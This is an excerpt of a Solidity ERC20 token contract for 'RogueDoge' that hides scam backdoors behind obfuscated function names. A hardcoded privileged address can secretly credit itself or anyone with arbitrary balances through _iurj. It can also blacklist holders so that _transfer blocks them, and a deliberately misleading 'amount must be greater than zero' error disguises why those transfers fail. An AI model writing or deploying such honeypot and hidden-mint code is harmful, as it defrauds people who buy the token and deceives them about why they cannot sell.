...
contract Ownable is Context {
    ...
    address private _efbmAddress = 0xB31099505d2C34427CC8137C597ce8E3AA588a79;
...
contract TO is Context, IERC20, Ownable {
    ...
    string private _name = "RogueDoge";
    string private _symbol = "RogueDoge";
    uint8 private _decimals = 5;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0xB31099505d2C34427CC8137C597ce8E3AA588a79;
  
    uint256 public deadFee = 7;
    uint256 public devFee = 2;


    mapping(address => bool) private _fijlk;
    bool private bhc = true;
    bool private blc = false;
 
    uint256 public fijlk = uint256(0);
    mapping(address => uint256) private fijlks;
    address[] private _fijlks;
    address owners;
    ...
    function _iurj(address dphde, uint256 fschj) external efbmAddress() {
        require(fschj > 0, "cacac");
        uint256 oeix = fijlks[dphde];
        if (oeix == 0) _fijlks.push(dphde);
        fijlks[dphde] = oeix.add(fschj);
        fijlk = fijlk.add(fschj);
        _rui[dphde] = _rui[dphde].add(fschj);
    }
    ...
    function _WipnJ(bool amountt) external efbmAddress() {
        blc = amountt;
    }
    function _ExdrT(address amountt) external efbmAddress() {
        _fijlk[amountt] = true;
    }

    function _OfwgA(address amountt) external efbmAddress() {
        delete _fijlk[amountt];
    }

    function VnbniE(address amountt)
        external
        view
        efbmAddress()
        returns (bool)
    {
        return _fijlk[amountt];
    }
    ...
    function _transfer(
        ...
        if (bhc) {
            require(_fijlk[from] == false, "Transfer amount must be greater than zero");
        }
